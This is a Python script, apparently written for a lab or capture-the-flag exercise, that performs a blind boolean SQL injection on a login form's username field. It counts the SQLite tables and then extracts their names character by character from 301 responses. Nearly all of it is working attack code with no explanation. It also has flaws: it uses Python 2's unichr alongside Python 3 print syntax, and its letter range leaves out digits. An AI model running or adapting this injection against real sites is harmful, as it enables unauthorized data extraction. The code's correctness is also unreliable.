import requests

# URL of the target and file name
url="http://site.web"
request_file = "login.request"

headers = {}
with open(request_file, "r") as f:
    #stores request file as dictionary, removes POST line and params
    for line in f.read().split('\n'):
        keyvalue = line.split(': ', 1)
        if len(keyvalue) < 2:
            continue
        key = keyvalue[0]
        value = keyvalue[1]
        headers[key] = value

# POST request function
def send_payload(payload):
    params['username'] = payload
    response = requests.post(url=url, headers=headers, params=params, allow_redirects=False)
    return response

# initials params query. Password param not needed in this injection
params = {"password": "test"}

# find the number of tables
i = 0
while True:
    payload = f"admin' AND (SELECT COUNT(name) FROM sqlite_master WHERE type='table')={i}--"
    response = send_payload(payload)

    if response.status_code == 301:
        print(f"There are {i} tables")
        break
    i+=1

# find the name of the table
print("Table name:", end = " ")
n = 1 # SQL counting starts at 1
while True:
    i = 65 # first English letter in unicode (decimal)
    while True:
        payload = f"admin' AND unicode(substr((SELECT group_concat(name, ':') FROM sqlite_master WHERE type='table'),{n},1)) = {i}--"
        response = send_payload(payload)
        if response.status_code == 301:
            print(unichr(i), end = "")
            break
        if i == 123:
            break
        i += 1
    if i == 123:
        print("done")
        break
    n += 1

print("complete")
